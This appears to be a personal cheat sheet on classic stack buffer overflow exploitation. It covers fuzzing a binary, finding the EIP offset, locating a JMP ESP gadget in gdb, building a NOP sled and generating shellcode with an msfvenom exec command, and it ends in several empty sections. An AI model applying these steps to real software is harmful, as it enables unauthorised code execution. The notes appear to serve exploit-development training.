## Exploit Development
```

Buffer Overflow Defenses:
Non executable (NX) stack
Address Space Layout Randomization (ASLR)
Data Execution Prevention (DEP)
Stack Canaries
Position Independent Executable (PIE)

🍖️ & 🥔️:

./func $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") -- As an argument
./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") -- As user input


https://wiremask.eu/tools/buffer-overflow-pattern-generator/

USE UNIQUE BUFFER AND FIND THE OFFSET FOR EIP(instruction Pointer)

```

## GDB
```

gdb ./func

gdb-peda$ run <<<$(python3 buff.py)

info functions -- FIRST
gdb-peda$ pdisass main
call   0x3d0 <gets@plt> (Vulnerability func == gets)



```

## Shellcode
```

msfvenom -- msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python

```

## Finding stuffs
```

env - gdb ./func
(gdb) show env
LINES=27
COLUMNS=104
(gdb) unset env COLUMNS
(gdb) unset env LINES

(gdb) info proc map
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
            (after heap)  (end of stack) (jump) (esp)
(grab 5?)(reverse them?(little endian))

******DONT USE PYTHON3********

```

## DEMO
```

Figure out what normal looks like(run program)(does it take arguments or user input){<<< or not}

Overflow the program with random char lengths

gdb ./program -----
#COMMANDS
run
run <<<$(python script.py)
run $(python script.py)
info functions
pdisass main
pdisass (functions seen in main)

WIREMASK.EU (random string)
paste into script and run(find byte offset)
******EIP REGISTER******

FIND JMP ESP:
env - gdb ./func
(gdb) show env
LINES=27
COLUMNS=104
(gdb) unset env COLUMNS
(gdb) unset env LINES

(gdb) info proc map
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
   (start after heap)  (end of stack) (jump) (esp)
(grab 5?)(reverse them?(little endian))
0xf7de3b59 -> \x59\x3b\xde\xf7

NOOP SLED:
0x90

SHELLCODE:
msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python (can change CMD to different commands)


```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

